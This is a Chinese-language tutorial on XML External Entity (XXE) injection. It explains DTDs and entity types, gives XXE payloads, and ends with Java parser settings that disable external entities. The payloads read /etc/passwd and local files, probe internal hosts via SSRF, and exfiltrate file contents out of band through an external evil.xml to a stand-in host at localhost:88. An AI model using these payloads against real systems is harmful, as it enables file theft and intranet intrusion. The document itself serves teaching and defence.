## **0x01:知识准备**

```
XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，
没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。
xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。
```

### DTD

文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。  
内部声明DTD:

```
<!DOCTYPE 根元素 [元素声明]>
```

引用外部DTD:

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

DTD文档中有很多重要的关键字如下：

* DOCTYPE（DTD的声明）
* ENTITY（实体的声明）
* SYSTEM、PUBLIC（外部资源申请）

### 实体

实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。  
实体按类型主要分为以下四种：

* 内置实体 \(Built-in entities\)
* 字符实体 \(Character entities\)
* 通用实体 \(General entities\)
* 参数实体 \(Parameter entities\)

实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。  
完整的实体类别可参考[DTD - Entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)

#### 实体类别介绍

参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&实体名称。  
参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。

**内部实体：**

```
<!ENTITY 实体名称 "实体的值">
```

**外部实体:**

```
<!ENTITY 实体名称 SYSTEM "URI">
```

**参数实体：**

```
<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">
```

实例演示：除参数实体外实体+内部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "nMask">]>
<foo>
        <value>&name;</value> 
</foo>
```

实例演示：参数实体+外部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
```

注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

#### 外部实体

外部实体即在DTD中使用

```
<!ENTITY 实体名称 SYSTEM "URI">
```

语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？

主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：

![](/assets/xxe1.png)

实例演示：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY content SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&content;</value> 
</foo>
```

## 漏洞检测

XML实体分为四种：字符实体，命名实体，外部实体，参数实体

**1、命名实体写法：**

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///c://test/1.txt" >]>        
<value>&xxe;</value>

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://otherhost/xxxx.php" >]>        
<value>&xxe;</value>
```

可以用做xxe+ssrf，用于内网扫描

![](/assets/xxe3.png)  
**2、命名实体+外部实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
<!ENTITY dtd SYSTEM "http://localhost:88/evil.xml">
]> 
<value>&dtd;</value>
```

这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多

![](/assets/xxe2.png)  
**3、第一种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///c://test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml"> 
%dtd; %all; 
]> 
<value>&send;</value>
```

其中evil.xml文件内容为

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:88%file;'>">
```

调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send

**第二种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml">
%dtd;
%send;
]>
<root></root>
```

其中evil.xml文件内容为：

```
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost:88/?content=%file;'>"> %payload;
```

调用过程和第一种方法类似

## **总结**

XML 攻击大都是由解析器发出外部资源请求而造成的，还有结合一些协议的特性可以轻松绕过 xml 格式要求。其中主要的关键字 DOCTYPE（DTD的声明），ENTITY（实体的声明）， SYSTEM、PUBLIC（外部资源申请）。

由与 普通实体 和 参数实体 的灵活引用，从而引发各种套路。

**接下来，看一下修复方法：**

java有很多解析xml的包，每个包的修复方式都不一样，但最终结果都是禁用外部实体dtd

### XMLInputFactory

```
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); // This disables DTDs entirely for that factory
xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false); // disable external entities
```

### TransformerFactory

包名：javax.xml.transform

```
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

### Validator

包名：javax.xml.validation

```
SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
Schema schema = factory.newSchema();
Validator validator = schema.newValidator();
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

### SchemaFactory

包名：javax.xml.validation.SchemaFactory

```
SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
Schema schema = factory.newSchema(Source);
```

### SAXTransformerFactory

包名：javax.xml.transform.sax.SAXTransformerFactory

```
SAXTransformerFactory sf = SAXTransformerFactory.newInstance();
sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
sf.newXMLFilter(Source);
```

### XMLReader

包名：org.xml.sax.XMLReader

```
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false); // This may not be strictly required as DTDs shouldn't be allowed at all, per previous line.
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### SAXReader

包名：org.dom4j.io.SAXReader

```
saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### SAXBuilder

包名：org.jdom2.input.SAXBuilder

```
SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
Document doc = builder.build(new File(fileName));
```

### JAXB Unmarshaller

包名：javax.xml.bind.Unmarshaller

```
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(new StringReader(xml)));
JAXBContext jc = JAXBContext.newInstance(Object.class);
Unmarshaller um = jc.createUnmarshaller();
um.unmarshal(xmlSource);
```

### XPathExpression

包名：javax.xml.xpath.XPathExpression

```
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();            
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); 
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");     
DocumentBuilder builder = df.newDocumentBuilder();
String result = new XPathExpression().evaluate( builder.parse(new ByteArrayInputStream(xml.getBytes())) );
```

更多可参考：[https://www.owasp.org/index.php/XML\_External\_Entity\_\(XXE\)\_Prevention\_Cheat\_Sheet](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet)

知识点

**setFeature：**可以进行设置，打开或者关闭某些功能，参数有两个，第一个为一个URI字符串，表示功能类型，第二个为一个boolean型数据，表示是否打开，关闭某个功能。如：

```
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); //将功能 “http://apache.org/xml/features/disallow-doctype-decl” 设置为“真”时, 不允许使用 DOCTYPE。
```

为了避免**XXE injections**，应为XML代理、解析器或读取器设置下面的属性：

```
factory.setFeature("http://xml.org/sax/features/external-general-entities",false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

如果根本不需要 `inline DOCTYPE 声明`，可直接使用以下属性将其`完全禁用`：

```
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
```



部分feature的定义

| feature |
| :--- |


|  | 功能 |
| :--- | :--- |
| [http://xml.org/sax/features/namespaces](http://xml.org/sax/features/namespaces) | 打开、关闭名空间处理功能。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://xml.org/sax/features/namespace-prefixes](http://xml.org/sax/features/namespace-prefixes) | 报告、不报告名空间前缀。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://xml.org/sax/features/string-interning](http://xml.org/sax/features/string-interning) | 是否将所有的名字等字符串内部化，即使用String.intern\(\)方法处理所有的名字字符串，Xerces目前不支持这个特性，在支持这种特性的解析器上这样可以节省内存空间，但是可能会稍微降低速度。在处理有很多的重复tag的时候打开这个特性可以节约很多空间；由于节省了重新分配内存的时间，反而可能会提高速度。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://xml.org/sax/features/validation](http://xml.org/sax/features/validation) | 是否打开校验。当关闭校验的时候可以大大节约内存空间并且大大提高解析速度。因此如果使用的XML文档是可靠的，例如程序生成的，最好关闭校验。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://xml.org/sax/features/external-general-entities](http://xml.org/sax/features/external-general-entities) | 是否包含外部生成的实体。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://xml.org/sax/features/external-parameter-entities](http://xml.org/sax/features/external-parameter-entities) | 是否包含外部的参数，包括外部DTD子集。当正在解析文档时为只读属性，未解析文档的状态下为读写。 |
| [http://apache.org/xml/features/validation/schema](http://apache.org/xml/features/validation/schema) | 是否使用schema。这个特性是apache为Xerces提供的。 |
| [http://apache.org/xml/features/validation/dynamic](http://apache.org/xml/features/validation/dynamic) | 当设置为true时，仅仅在XML文档指明语法时进行校验，若设置为false，则由[http://xml.org/sax/features/validation决定，若其为false则不校验，若为true则校验。](http://xml.org/sax/features/validation决定，若其为false则不校验，若为true则校验。) |
| [http://apache.org/xml/features/validation/warn-on-duplicate-attdef](http://apache.org/xml/features/validation/warn-on-duplicate-attdef) | 是否在遇到重复的属性声明时警告。 |
| [http://apache.org/xml/features/validation/warn-on-undeclared-elemdef](http://apache.org/xml/features/validation/warn-on-undeclared-elemdef) | 是否在遇到未定义的元素的时候警告。 |
| [http://apache.org/xml/features/allow-java-encodings](http://apache.org/xml/features/allow-java-encodings) | 是否允许在XMLDecl和TextDecl使用java的字符编码名。如果设置为false则在遇到java字符编码名的时候会产生一个错误。需要注意的是不是所有的解析器都会允许使用java字符编码名的。 |
| [http://apache.org/xml/features/continue-after-fatal-error](http://apache.org/xml/features/continue-after-fatal-error) | 是否在发生致命错误后继续进行解析。 |
| [http://apache.org/xml/features/nonvalidating/load-dtd-grammar](http://apache.org/xml/features/nonvalidating/load-dtd-grammar) | 是否装载DTD语法并且自动增添DTD中定义的缺省值。若[http://xml.org/sax/features/validation设置为true则此特性自动设置为true。](http://xml.org/sax/features/validation设置为true则此特性自动设置为true。) |
| [http://apache.org/xml/features/dom/defer-node-expansion](http://apache.org/xml/features/dom/defer-node-expansion) | 这个特性是DOM特性，在这里一起介绍了。是否使用懒惰型节点展开，当这个特性设置为true时，可以提高解析速度并节约内存。这个特性同属性[http://apache.org/xml/properties/dom/document-class-name的设置有关。](http://apache.org/xml/properties/dom/document-class-name的设置有关。) |
| [http://apache.org/xml/features/dom/create-entity-ref-nodes](http://apache.org/xml/features/dom/create-entity-ref-nodes) | 这个特性是DOM特性，是否用引用的方式建立实体节点，若设置为true则会建立EntityReference节点，若设置为false则会用实际字符串取代实体引用。 |
| [http://apache.org/xml/features/dom/include-ignorable-whitespace](http://apache.org/xml/features/dom/include-ignorable-whitespace) | 这个特性是DOM特性，是否将可以忽略的空白字符串包含在DOM树里面，缺省为true。但是笔者本人一般情况下会设置为false。另外仅仅在打开了校验的情况下才可以判断出来是否有空白字符串。因此这个特性是同[http://xml.org/sax/features/validation相关的。](http://xml.org/sax/features/validation相关的。) |

参考：

浅谈XXE漏洞攻击与防御 [https://thief.one/2017/06/20/1/](https://thief.one/2017/06/20/1/)

XXE漏洞以及Blind XXE总结 [https://blog.csdn.net/u011721501/article/details/43775691](https://blog.csdn.net/u011721501/article/details/43775691)

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

[XXE漏洞攻防之我见](https://www.anquanke.com/post/id/86075)

[神奇的Content-Type——在JSON中玩转XXE攻击](http://bobao.360.cn/learning/detail/360.html)

DTD/XXE 攻击笔记分享 [http://www.freebuf.com/articles/web/97833.html](http://www.freebuf.com/articles/web/97833.html)

[https://blog.csdn.net/qq\_32331073/article/details/79941132](https://blog.csdn.net/qq_32331073/article/details/79941132)

